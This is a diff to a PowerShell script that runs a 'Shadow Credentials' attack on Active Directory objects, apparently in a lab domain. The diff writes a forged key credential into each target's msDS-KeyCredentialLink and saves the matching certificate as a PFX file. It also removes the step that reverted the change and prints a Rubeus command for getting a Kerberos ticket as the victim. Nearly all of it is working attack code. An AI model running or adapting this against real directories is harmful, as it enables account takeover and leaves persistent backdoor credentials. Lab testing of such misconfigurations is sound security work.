@@ -1,3 +1,24 @@
+[CmdletBinding()]
+param(
+    [string]$OU = 'OU=ShadowCreds3,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan',
+    [string]$TranscriptPath
+)
+
+
+if (-not $TranscriptPath) {
+    $timestamp = Get-Date -Format "yyyyMMddHHmmss"
+    $TranscriptPath = Join-Path -Path $PSScriptRoot -ChildPath "ShadowCredsTest-$timestamp.log"
+}
+
+$transcriptDirectory = Split-Path -Parent $TranscriptPath
+if ($transcriptDirectory -and -not (Test-Path -LiteralPath $transcriptDirectory)) {
+    New-Item -Path $transcriptDirectory -ItemType Directory -Force | Out-Null
+}
+
+Import-Module ActiveDirectory -ErrorAction Stop
+Import-Module DSInternals -ErrorAction Stop
+
+
 function New-KeyCredentialValue {
     param(
         [Microsoft.ActiveDirectory.Management.ADObject]$AdObject
@@ -7,7 +28,6 @@ function New-KeyCredentialValue {
         return $null
     }
 
-    # TODO: Store the certificate in the current working directory as a base64-encoded PFX certificate export. The file name should be ($ADObject.Name).pfx
     $certificateParams = @{
         Subject            = 'itdoesnotreallymatteratall'
         KeyLength          = 2048
@@ -27,6 +47,18 @@ function New-KeyCredentialValue {
         return $null
     }
 
+    $pfxFilePath = $null
+    try {
+        $pfxFilePath = Join-Path -Path (Get-Location).ProviderPath -ChildPath ("{0}.pfx" -f $AdObject.Name)
+        $certCollection = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection
+        [void]$certCollection.Add($certificate)
+        $pfxBytes = $certCollection.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
+        $encodedPfx = [Convert]::ToBase64String($pfxBytes)
+        [System.IO.File]::WriteAllText($pfxFilePath, $encodedPfx)
+    } catch {
+        Write-Warning ("    Failed to export PFX for {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
+    }
+
     try {
         $keyParams = @{
             Certificate = $certificate
@@ -40,7 +72,11 @@ function New-KeyCredentialValue {
             return $null
         }
 
-        return $ngcKey.ToDNWithBinary()
+        if ($pfxFilePath) {
+            $ngcKey = $ngcKey | Add-Member -MemberType NoteProperty -Name PfxFilePath -Value $pfxFilePath -PassThru
+        }
+
+        return $ngcKey
     } catch {
         Write-Warning ("    Failed to build key credential value for {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
         return $null
@@ -69,25 +105,74 @@ function Invoke-KeyCredentialWriteTest {
     }
 
     $addSucceeded = $false
+    $key = $keyCredentialValue.ToDNWithBinary()
+    $keyString = $keyCredentialValue.ToString()
+    Write-Host "    Key: $key"
+    Write-Host "    Type: $($key.Gettype())"
     try {
-        Set-ADObject -Identity $dn -Clear 'msDS-KeyCredentialLink' -Add @{ 'msDS-KeyCredentialLink' = $keyCredentialValue } -ErrorAction Stop
+
+
+        Set-ADObject -Identity $dn -Clear 'msDS-KeyCredentialLink' -Add @{ 'msDS-KeyCredentialLink' = $key } -ErrorAction Stop -Verbose
         $addSucceeded = $true
-        Write-Host "    Added msDS-KeyCredentialLink."
+        Write-Host "    Added msDS-KeyCredentialLink: $keyString"
     } catch {
         Write-Warning ("    Failed to modify msDS-KeyCredentialLink on {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
     } finally {
         if ($addSucceeded) {
-            # TODO if add succeeds, output the command needed to create a TGT using the credential in Rubeus
-            try {
-                Set-ADObject -Identity $dn -Remove @{ 'msDS-KeyCredentialLink' = $keyCredentialValue } -ErrorAction Stop
-                Write-Host "    Removed placeholder msDS-KeyCredentialLink to revert state."
-            } catch {
-                Write-Warning ("    Unable to clean up msDS-KeyCredentialLink on {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
+            $pfxPath = $null
+            if ($keyCredentialValue -and $keyCredentialValue.PSObject.Properties['PfxFilePath']) {
+                $pfxPath = $keyCredentialValue.PSObject.Properties['PfxFilePath'].Value
+            }
+
+            $domainComponents = ($dn -split ',') | Where-Object { $_ -like 'DC=*' } | ForEach-Object { $_.Substring(3) }
+            $domainName = ($domainComponents -join '.')
+            if (-not $domainName) {
+                try {
+                    $domainName = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+                } catch {
+                    $domainName = $null
+                }
+            }
+
+            if ($pfxPath -and $domainName) {
+                $rubeusCommand = "Rubeus.exe asktgt /user:{0} /domain:{1} /certificate:'{2}' /show" -f $sam, $domainName, $pfxPath
+                Write-Host ("    Run the following in Rubeus to request a TGT:`n        {0}" -f $rubeusCommand)
+            } else {
+                Write-Warning ("    Unable to build the Rubeus command because the PFX path or domain name is missing.")
             }
         }
     }
 }
 
+function Write-CurrentTokenInfo {
+    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    Write-Host "User Identity: $($identity.Name)"
+    Write-Host "Authentication Type: $($identity.AuthenticationType)"
+    Write-Host "Impersonation Level: $($identity.ImpersonationLevel)"
+    Write-Host "SID: $($identity.User.Value)"
+
+    Write-Host "Group Membership (token):"
+    $groupInfo = foreach ($groupSid in $identity.Groups) {
+        $name = $null
+        try {
+            $name = $groupSid.Translate([System.Security.Principal.NTAccount]).Value
+        } catch {
+            $name = "(unresolved)"
+        }
+
+        [PSCustomObject]@{
+            Name       = $name
+            SID        = $groupSid.Value
+            Attributes = $groupSid.Attributes
+        }
+    }
+
+    if ($groupInfo) {
+        $groupInfo | Format-Table -AutoSize
+    } else {
+        Write-Host "    (No groups)"
+    }
+}
 
 $propertiesToLoad = @(
     'objectClass',
@@ -102,6 +187,32 @@ $propertiesToLoad = @(
     'msDS-KeyCredentialLink'
 )
 
-
-$OU = 'OU=ShadowCreds,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan'
 $rawObjects = Get-ADObject -SearchBase $OU -SearchScope OneLevel -Filter * -Properties $propertiesToLoad -ErrorAction Stop | Sort-Object -Property Name
+
+$transcriptStarted = $false
+try {
+    Start-Transcript -Path $TranscriptPath -Force
+    $transcriptStarted = $true
+
+        if (-not $rawObjects) {
+        Write-Warning "No ValidatedWrite test objects were located in $OU."
+        return
+    }
+
+    Write-Host ("=" * 60)
+    Write-Host "Current user token information:"
+    Write-CurrentTokenInfo
+
+    foreach ($object in $rawObjects) {
+        Write-Host ("=" * 60)
+        Write-Host ("Processing {0}" -f $object.Name)
+        Write-Host ("DistinguishedName: {0}" -f $object.DistinguishedName)
+        Invoke-KeyCredentialWriteTest $object
+        Get-ADObject -Identity $object.DistinguishedName -Properties msDS-KeyCredentialLink
+    }
+
+} finally {
+    if ($transcriptStarted) {
+        Stop-Transcript
+    }
+}
